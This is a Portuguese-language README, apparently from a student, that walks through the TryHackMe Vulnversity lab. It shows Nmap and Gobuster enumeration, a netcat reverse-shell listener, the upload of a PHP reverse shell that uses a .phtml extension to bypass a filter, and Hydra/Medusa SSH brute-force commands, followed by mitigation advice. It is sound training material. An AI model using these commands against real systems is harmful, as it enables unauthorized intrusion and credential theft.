#  Estudo de Ataques de Força Bruta — Sala Vulnversity (TryHackMe)

Projeto desenvolvido como parte do desafio de cibersegurança sobre
ataques de força bruta e exploração de vulnerabilidades web.

##  Sobre este repositório

Por limitações de tempo/hardware para montar o ambiente local completo
(VirtualBox + Kali Linux + Metasploitable 2), a prática foi realizada
na sala **Vulnversity**, do TryHackMe, que simula um pentest completo:
reconhecimento de rede, enumeração de serviços web, upload de shell
reversa e (opcionalmente) força bruta de credenciais SSH.

##  Ambiente utilizado

- Plataforma: TryHackMe
- Sala: Vulnversity
- AttackBox IP: 10.64.108.50
- Máquina alvo: 10.64.131.169
- Ferramentas: Nmap, Gobuster, Netcat

##  Etapas realizadas

### 1. Reconhecimento (Nmap)

bash
nmap -Pn -O 10.64.131.169


**Resultado:**
\`\`\`
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
\`\`\`

A porta **3333** chamou atenção por ser um serviço HTTP não padrão —
foi o alvo da enumeração web a seguir.

### 2. Enumeração de diretórios web (Gobuster)

bash
gobuster dir -u http://10.64.131.169:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt


**Resultado:** encontrado o diretório `/internal/`, que continha um
formulário de upload de arquivos sem validação adequada de extensão/tipo.

### 3. Exploração — Upload de shell reversa

Preparado um listener para receber a conexão reversa:

bash
nc -lvnp 1234


Upload de um `php-reverse-shell.phtml` (extensão usada para contornar
filtro de upload que bloqueava `.php`) através do formulário encontrado
em `/internal/`, e acesso ao arquivo via navegador para executar o payload:

\`\`\`
http://10.64.131.169:3333/internal/uploads/php-reverse-shell.phtml
\`\`\`

**Resultado:** conexão reversa recebida no listener, obtendo shell no
sistema alvo.

\`\`\bash
hydra -l bill -P /usr/share/wordlists/rockyou.txt 10.64.131.169 ssh
\`\`\

**Equivalente em Medusa** (ferramenta foco original do desafio):
\`\`\`bash
medusa -h 10.64.131.169 -u bill -P /usr/share/wordlists/rockyou.txt -M ssh
\`\`\`

## Medidas de mitigação recomendadas

- Validação rigorosa de tipo/extensão de arquivos em formulários de upload
  (a causa raiz da exploração deste cenário)
- Isolamento de diretórios de upload (sem permissão de execução)
- Bloqueio de conta após N tentativas falhas de login (account lockout)
- Rate limiting / fail2ban em serviços expostos (SSH, FTP)
- Autenticação multifator (MFA)
- Políticas de senha forte
- Ocultar/restringir diretórios sensíveis e desabilitar listagem
- Fechar portas/serviços desnecessários (ex: Squid proxy exposto)
- Monitoramento de logs e alertas para uploads e tentativas de login suspeitas

##  Aprendizados

Este desafio mostrou na prática como um serviço web em porta não padrão
(3333) pode passar despercebido sem um scan completo de portas, e como
a falta de validação de upload é uma das vulnerabilidades mais comuns e
graves em aplicações web — permitindo execução remota de código através
de uma simples shell reversa em PHP. Também reforçou a importância de
combinar reconhecimento (Nmap), enumeração (Gobuster) e exploração de
forma metódica, e como medidas simples de validação e hardening
poderiam ter bloqueado todo o ataque.

## ⚠️ Aviso

Este material é estritamente educacional, realizado em ambiente
controlado e autorizado (TryHackMe). Não deve ser usado contra
sistemas sem autorização explícita.
